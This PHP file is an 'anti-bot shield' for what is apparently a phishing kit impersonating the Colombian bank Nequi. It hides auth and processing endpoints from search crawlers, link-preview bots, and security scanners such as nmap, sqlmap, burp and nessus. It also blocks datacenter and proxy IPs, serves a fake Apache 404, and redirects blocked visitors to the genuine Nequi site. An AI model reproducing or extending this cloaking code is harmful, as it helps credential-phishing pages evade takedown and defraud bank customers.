<?php
/**
 * Master Anti-Bot Shield (Centralized)
 * Optimized for Nequi/Multi-bank Project.
 */
if (!function_exists('getallheaders')) {
    function getallheaders() {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/db.php';

class AntiBotShield {
    private static $blacklistedUAs = [
        'googlebot', 'bingbot', 'slurp', 'duckduckgo', 'baiduspider', 'yandexbot', 
        'sogou', 'exabot', 'facebot', 'ia_archiver', 'facebookexternalhit',
        'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
        'showyoubot', 'outbrain', 'pinterest/0.', 'developers.google.com/+/web/snippet',
        'slackbot', 'vkshare', 'redditbot', 'applebot', 'whatsapp', 'flipboard',
        'tumblr', 'bitlybot', 'skypeuripreview', 'nuzzel', 'discordbot', 
        'google-site-verification', 'screaming frog', 'ahrefsbot', 'semrushbot',
        'python', 'curl', 'wget', 'headless', 'phantomjs', 'selenium', 'puppeteer',
        'playwright', 'postman', 'insomnia', 'zabbix', 'nagios', 'libwww-perl',
        'nmap', 'sqlmap', 'nikto', 'acunetix', 'goby', 'openvas', 'burp', 'nessus'
    ];

    private static function logBlock($reason, $ip) {
        $logFile = __DIR__ . '/shield_block.log';
        $msg = "[" . date('Y-m-d H:i:s') . "] Blocked by $reason from $ip - URL: " . $_SERVER['REQUEST_URI'] . "\n";
        @file_put_contents($logFile, $msg, FILE_APPEND);
    }

    public static function protect() {
        // Si el escudo está desactivado en config.php, permitir el acceso
        if (defined('ENABLE_SHIELD') && !ENABLE_SHIELD) {
            return;
        }

        $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
        $ip = self::getVisitorIp();
        $uri = $_SERVER['REQUEST_URI'] ?? '/';
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

        // Check if IP is manually blocked by admin
        if (self::isManualBlocked($ip)) {
            header("Location: https://clientes.nequi.com.co/recargas");
            exit;
        }

        // Bypass for local development
        $isLocal = ($ip === '127.0.0.1' || $ip === '::1');
        if ($isLocal) {
            return;
        }

        // 0. Honeypot check (Instant block)
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['email_verify'])) {
            self::logBlock("Honeypot", $ip);
            self::renderFake404();
        }

        // 1. Check User-Agent (Fastest)
        if (empty($ua)) {
            self::logBlock("Empty User-Agent", $ip);
            self::renderFake404();
        }

        foreach (self::$blacklistedUAs as $bot) {
            if (strpos($ua, $bot) !== false) {
                self::logBlock("Blacklisted UA ($bot)", $ip);
                self::renderFake404();
            }
        }

        // 2. Check Browser Headers (Relaxed: avoid false positives with HTTP, Safari, Firefox)
        if (strpos($uri, '.php') !== false || $uri === '/') {
            $headers = array_change_key_case(getallheaders(), CASE_LOWER);
            
            // Si no tiene User-Agent ni ningún encabezado Accept, es bot básico
            if (empty($headers['user-agent']) && empty($headers['accept'])) {
                self::logBlock("Missing Basic Headers", $ip);
                self::renderFake404();
            }
        }

        // 3. Referrer Check for sensitive endpoints
        $sensitivePatterns = ['process.php', 'auth_v1.php', 'auth_token.php'];
        $isSensitive = false;
        foreach ($sensitivePatterns as $pattern) {
            if (strpos($uri, $pattern) !== false) {
                $isSensitive = true;
                break;
            }
        }

        if ($isSensitive) {
            if (empty($referer) || strpos($referer, $_SERVER['HTTP_HOST']) === false) {
                self::logBlock("Invalid Referer", $ip);
                self::renderFake404();
            }
        }

        // 4. IP Intelligence Check (Data Centers / Proxies / VPNs)
        // Solo activo si está configurado explícitamente para evitar bloquear al administrador
        if (defined('ENABLE_DATACENTER_CHECK') && ENABLE_DATACENTER_CHECK && self::isDataCenter($ip)) {
            self::logBlock("DataCenter/Proxy", $ip);
            self::renderFake404();
        }
    }

    public static function getVisitorIp() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            return $_SERVER['HTTP_X_REAL_IP'];
        } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
        } else {
            return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        }
    }

    private static function isDataCenter($ip) {
        if (session_status() === PHP_SESSION_NONE) session_start();
        if (isset($_SESSION['is_bot_ip']) && $_SESSION['is_bot_ip'] === $ip) return false;
        if (isset($_SESSION['is_blocked_ip']) && $_SESSION['is_blocked_ip'] === $ip) return true;

        $apiUrl = "http://ip-api.com/json/" . $ip . "?fields=status,hosting,proxy,asname";
        $ctx = stream_context_create(['http' => ['timeout' => 1.5]]);
        $response = @file_get_contents($apiUrl, false, $ctx);
        
        if ($response === false) return false;

        $data = json_decode($response, true);
        if ($data && $data['status'] === 'success') {
            if (($data['hosting'] ?? false) === true || ($data['proxy'] ?? false) === true) {
                $_SESSION['is_blocked_ip'] = $ip;
                return true;
            }
            $_SESSION['is_bot_ip'] = $ip;
        }
        return false;
    }

    private static function isManualBlocked($ip) {
        try {
            $pdo = getDB();
            $stmt = $pdo->prepare("SELECT id FROM blocked_ips WHERE ip = ? LIMIT 1");
            $stmt->execute([$ip]);
            return (bool)$stmt->fetch();
        } catch (Exception $e) {
            return false;
        }
    }

    private static function renderFake404() {
        header("HTTP/1.0 404 Not Found", true, 404);
        ?>
        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <hr>
        <address>Apache/2.4.41 (Ubuntu) Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port 80</address>
        </body></html>
        <?php
        exit;
    }
}

// Auto-run
AntiBotShield::protect();
